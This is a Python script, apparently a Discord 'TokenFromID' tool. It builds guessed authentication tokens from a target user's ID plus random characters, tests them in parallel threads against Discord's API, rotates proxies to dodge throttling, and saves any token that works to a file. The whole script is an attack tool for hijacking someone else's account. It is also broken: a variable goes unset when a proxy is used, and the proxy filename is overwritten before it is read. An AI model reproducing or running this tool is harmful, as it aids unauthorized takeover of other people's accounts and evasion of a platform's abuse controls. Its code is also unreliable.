import os
import base64
import time
import random
import string
import requests
from colorama import Fore, init, Style
import threading
import colorama

api = 'https://discordapp.com/api/v9/users/@me'
proxies = 'proxies.txt'
files = 'files.txt'
clear_command = 'cls' if os.name == 'nt' else 'clear'

def encode_base64(input_str):
    return base64.urlsafe_b64encode(input_str.encode()).decode().rstrip("=")

def generate_random_string(k):
    characters = string.ascii_letters + string.digits + "-_"
    return ''.join(random.choice(characters) for _ in range(k))

def get_token(user_id):
    token = f"{encode_base64(user_id)}.{generate_random_string(6)}.{generate_random_string(38)}"
    return token

def check_proxy(proxy):
    try:
        requests.get('https://www.google.com', proxies={'http': proxy, 'https': proxy}, timeout=5)
        return True
    except requests.RequestException:
        return False

def check_token_validity(token, proxy):
    headers = {'Authorization': token}
    try:
        if proxy:
            if not check_proxy(proxy):
                print(colorama.Fore.GREEN + "[TokenFromID]: " + colorama.Fore.LIGHTYELLOW_EX + "Proxy not working, skipping token check.")
                return
        else:
            login = requests.get(api, headers=headers)

        if login.status_code == 200:
            print(colorama.Fore.MAGENTA + "[TokenFromID]: " + f"{Fore.GREEN}VALID TOKEN - ( {token} ){Fore.RESET}") 
            write_file(files, token)
        else:
            print(colorama.Fore.MAGENTA + "[TokenFromID]: " + f"{Fore.RED}INVALID TOKEN - ( {token} ){Fore.RESET}") 
    except requests.exceptions.RequestException as e:
        print(colorama.Fore.GREEN + "[TokenFromID]: " + f"{Fore.RED}AN ERROR OCCURRED - ( {token} ){Fore.RESET}") 
        print(f"Error details: {e}")

def write_file(filename, content):
    with open(filename, 'a+') as f:
        f.write(f'{content}\n')

def read_proxies(file_path):
    with open(file_path, 'r') as file:
        proxies = [line.strip() for line in file if line.strip()]
    return proxies

def worker(num_tokens, user_id, use_proxies, proxies):
    num_tokens = int(num_tokens) 
    for _ in range(num_tokens):
        token = get_token(user_id)
        proxy = random.choice(proxies) if use_proxies else None
        check_token_validity(token, proxy)
    time.sleep(2)

def main():
    while True:
        try:
            os.system(clear_command)
            print(Fore.GREEN + "[TokenFromID]: " + Fore.LIGHTYELLOW_EX + "What is the ID of the user to be found?")
            user_id = input(Fore.MAGENTA + "root@you:~$ " + Fore.WHITE)
            print(Fore.GREEN + "[TokenFromID]: " + Fore.LIGHTYELLOW_EX + "How many tokens will be tried?")
            token_amount = input(Fore.MAGENTA + "root@you:~$ " + Fore.WHITE)

            if not user_id.isdigit():
                raise ValueError
            break

        except ValueError:
            print(Fore.GREEN + "[TokenFromID]: " + Fore.RED + "Enter a valid number.")

    print(Fore.GREEN + "[TokenFromID]: " + Fore.LIGHTYELLOW_EX + "Use Proxies? (Y/N)")
    use_proxies = input(Fore.MAGENTA + "root@you:~$ " + Fore.WHITE).lower() == 'y'
    proxies = []

    if use_proxies:
        proxies = read_proxies(proxies)

        working = [proxy for proxy in proxies if check_proxy(proxy)]

        if not working:
            print(Fore.GREEN + "[TokenFromID]: " + Fore.RED + "No working proxies found.")
            return
        else:
            print(Fore.GREEN + "[TokenFromID]: " + Fore.LIGHTYELLOW_EX + "Proxies are working.")
            proxies = working

    while True:
        try:
            print(Fore.GREEN + "[TokenFromID]: " + Fore.LIGHTYELLOW_EX + "How many threads should be used?")
            threads_amount = input(Fore.MAGENTA + "root@you:~$ " + Fore.WHITE)

            threads_amount = int(threads_amount)
            if threads_amount <= 0:
                raise ValueError
            break
        except ValueError:
            print(Fore.GREEN + "[TokenFromID]: " + Fore.RED+ "Enter a valid number greater than zero.")

    if threads_amount > 10 and not use_proxies:
        print(Fore.GREEN + "[WARNING!!]: " + Fore.RED+ "Using multiple threads without a proxy may result in speed throttling or IP suspension in Discord.")
    time.sleep(5)
    os.system(clear_command)

    threads = []

    for _ in range(threads_amount):
        thread = threading.Thread(target=worker, args=(token_amount, user_id, use_proxies, proxies))
        threads.append(thread)

    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()

    time.sleep(1.5)
    os.system(clear_command)
    print(Fore.GREEN + "[TokenFromID]: " + Fore.GREEN + "Finished generating. Press Enter to exit :)")
    input()

if __name__ == "__main__":
    main()
